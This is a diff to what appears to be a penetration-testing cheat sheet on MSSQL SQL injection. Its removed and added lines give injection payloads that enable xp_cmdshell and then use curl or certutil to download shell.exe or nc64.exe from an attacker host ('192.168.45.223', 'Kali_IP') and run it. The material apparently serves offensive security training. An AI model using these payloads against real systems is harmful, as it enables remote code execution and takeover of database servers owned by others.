@@ -385,10 +385,14 @@ enable_xp_cmdshell
 xp_cmdshell whoami
 
 # SQL Injection
-' EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; --
-' ;EXEC xp_cmdshell "curl http://192.168.45.223/shell.exe -o C:\User\Public\shell.exe"--
-' ;EXEC xp_cmdshell "C:\User\Public\shell.exe"--
+';EXEC sp_configure 'show advanced options', 1;--
+';RECONFIGURE;--
+';EXEC sp_configure "xp_cmdshell", 1;--
+';RECONFIGURE;--
 
+Then try with
+
+';EXEC xp_cmdshell "certutil -urlcache -f http://Kali_IP/nc64.exe c:/windows/temp/nc64.exe";--
 
 # Classic from the course
 EXECUTE sp_configure 'show advanced options', 1;
